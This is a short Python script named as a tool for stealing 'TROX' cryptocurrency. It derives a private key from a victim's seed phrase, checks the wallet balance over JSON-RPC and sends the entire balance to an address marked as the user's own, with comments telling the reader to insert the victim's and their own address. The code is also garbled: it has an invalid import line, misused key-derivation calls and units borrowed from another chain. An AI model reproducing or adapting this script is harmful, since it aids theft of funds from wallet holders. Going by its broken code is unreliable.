import requests
from bip39 import Bip39
from bip32utils import BIP32Key, BIP32Key Derivation

def steal_troxbalance(mnemonic, rpc_url="https://trox.rpc.url"):
    # Derive private key from mnemonic (assuming standard BIP39 derivation)
    seed = Bip39(seed=mnemonic, passphrase="").GenerateMnemonic()
    private_key = Bip39(seed=seed, passphrase="").DerivePrivateKey()
    wallet_address = BIP32Key.fromExtendedKey(private_key).GetPublicKey().hex()

    # Get current balance
    balance_response = requests.get(
        rpc_url,
        params={
            "jsonrpc": "2.0",
            "id": 1,
            "method": "getBalance",
            "params": [wallet_address]
        }
    ).json()

    balance_lamports = balance_response["result"]["value"]
    print(f"Wallet: {wallet_address}")
    print(f"Available TROX: {balance_lamports / 1_000_000_000} TROX")  # 1 TROX = 1e9 lamports

    # Send stolen balance to your own address (hypothetical example)
    target_address = "TROX1wJvQnJ2P6P4nKqjY5gGk7sJpLpRf1eTnD8g"  # Replace with the victim's address
    your_address = "YOUR_TROX_ADDRESS"  # Replace with your own address

    # Example: Send all balance to your address (simplified)
    transfer_tx = {
        "jsonrpc": "2.0",
        "id": 2,
        "method": "sendTransaction",
        "params": [
            {
                "transactions": [
                    {
                        "from": target_address,
                        "to": your_address,
                        "amount": balance_lamports,
                        "fee": 500000000,
                        "signature": "0x" + private_key
                    }
                ]
            }
        ]
    }

    # Execute the transfer
    transfer_response = requests.post(rpc_url, json=transfer_tx).json()
    print(f"Transfer initiated! Transaction: {transfer_response['result']}")
